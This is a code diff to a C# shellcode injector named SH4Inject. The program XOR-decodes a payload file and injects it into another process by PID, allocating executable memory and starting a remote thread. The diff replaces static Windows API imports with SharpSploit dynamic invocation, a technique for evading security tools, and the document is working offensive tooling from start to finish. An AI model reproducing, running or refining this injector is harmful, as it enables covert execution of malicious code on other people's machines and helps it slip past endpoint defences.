@@ -1,22 +1,24 @@
 ﻿using System;
 using System.IO;
 using System.Runtime.InteropServices;
+using SharpSploit.Execution.DynamicInvoke;
 
 namespace SH4Inject
 {
     class Program
     {
-        [DllImport("kernel32.dll")]
-        static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        delegate IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
 
-        [DllImport("kernel32.dll")]
-        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 
-        [DllImport("kernel32.dll", SetLastError = true)]
-        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
 
-        [DllImport("kernel32.dll")]
-        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
 
         public static byte[] XOR(byte[] payload, string key)
         {
@@ -41,11 +43,30 @@ namespace SH4Inject
                 byte[] payload = File.ReadAllBytes(args[0]);
                 byte[] decrypted_payload = XOR(payload, key);
 
-                var hProcess = OpenProcess(0x001F0FFF, false, int.Parse(args[1]));
-                var alloc = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)decrypted_payload.Length, 0x1000 | 0x2000, 0x40);
+                var pointer = Generic.GetLibraryAddress("kernel32.dll", "OpenProcess");
+                var openProcess = Marshal.GetDelegateForFunctionPointer(pointer, typeof(OpenProcess)) as OpenProcess;
+                var hProcess = openProcess(0x001F0FFF, false, int.Parse(args[1]));
 
-                WriteProcessMemory(hProcess, alloc, decrypted_payload, (uint)decrypted_payload.Length, out UIntPtr bytesWritten);
-                CreateRemoteThread(hProcess, IntPtr.Zero, 0, alloc, IntPtr.Zero, 0, IntPtr.Zero);
+                pointer = Generic.GetLibraryAddress("kernel32.dll", "VirtualAllocEx");
+                var virtualAllocEx = Marshal.GetDelegateForFunctionPointer(pointer, typeof(VirtualAllocEx)) as VirtualAllocEx;
+                var alloc = virtualAllocEx(hProcess, IntPtr.Zero, (uint)decrypted_payload.Length, 0x1000 | 0x2000, 0x40);
+
+                pointer = Generic.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
+                var writeProcessMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(WriteProcessMemory)) as WriteProcessMemory;
+                writeProcessMemory(hProcess, alloc, decrypted_payload, (uint)decrypted_payload.Length, out UIntPtr bytesWritten);
+
+                // DEBUGGING
+                Console.WriteLine("Press a key to proceed.");
+                Console.ReadLine();
+
+                pointer = Generic.GetLibraryAddress("kernel32.dll", "CreateRemoteThread");
+                var createRemoteThread = Marshal.GetDelegateForFunctionPointer(pointer, typeof(CreateRemoteThread)) as CreateRemoteThread;
+                createRemoteThread(hProcess, IntPtr.Zero, 0, alloc, IntPtr.Zero, 0, IntPtr.Zero);
+
+
+                // DEBUGGING
+                Console.WriteLine("Press a key to close.");
+                Console.ReadLine();
             }
         }
     }
